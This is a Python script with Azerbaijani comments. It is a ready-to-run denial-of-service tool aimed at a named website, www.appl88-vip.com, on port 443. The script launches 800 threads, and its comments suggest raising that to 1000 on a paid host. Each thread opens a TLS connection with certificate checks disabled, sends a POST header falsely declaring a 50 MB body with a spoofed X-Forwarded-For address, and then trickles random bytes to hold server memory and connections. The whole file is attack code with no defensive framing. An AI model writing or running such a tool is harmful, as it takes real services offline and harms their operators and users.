import socket
import ssl
import threading
import random
import time
import os

# --- TARGET CONFIG ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
# Railway Paid üçün bu rəqəmi 1000-ə qaldıra bilərsən
THREADS = 800 

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def singularity_strike():
    # SSL Handshake-i serveri deşifrə ilə yormaq üçün mürəkkəb ciphers ilə qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            # TCP bağlantısı
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            # SSL bağlantısını qur və serveri CPU hesablamağa məcbur et
            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Serverin daxili API-sini və RAM-ını kilitləyən ağır başlıq
            # Content-Length-i 50 MB göstəririk ki, server dərhal Buffer ayırsın
            path = f"/?v={time.time()}&id={r_str(20)}&invite_code={random.randint(1000, 9999)}"
            ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            header = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 52428800\r\n" # 50 Megabyte "Yalançı" yük
                f"X-Forwarded-For: {ip}\r\n"
                f"X-Requested-With: XMLHttpRequest\r\n"
                f"Connection: Keep-Alive\r\n"
                f"\r\n"
            ).encode()

            conn.sendall(header)

            # İndi serveri "asılı" vəziyyətdə (Hanging) saxlayırıq
            # Hər saniyə cəmi 1-2 bayt göndəririk ki, port həmişə dolu görünsün
            for _ in range(300):
                conn.send(os.urandom(random.randint(1, 4)))
                time.sleep(random.uniform(0.1, 0.5))

            conn.close()
        except:
            pass

def main():
    print(f"💀 SINGULARITY PROTOCOL INITIALIZED: {TARGET_HOST}")
    print("[!] Resource Saturation: Targeting RAM & Process Table.")
    
    for i in range(THREADS):
        t = threading.Thread(target=singularity_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Singularity Warheads launched...")
            time.sleep(0.5)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
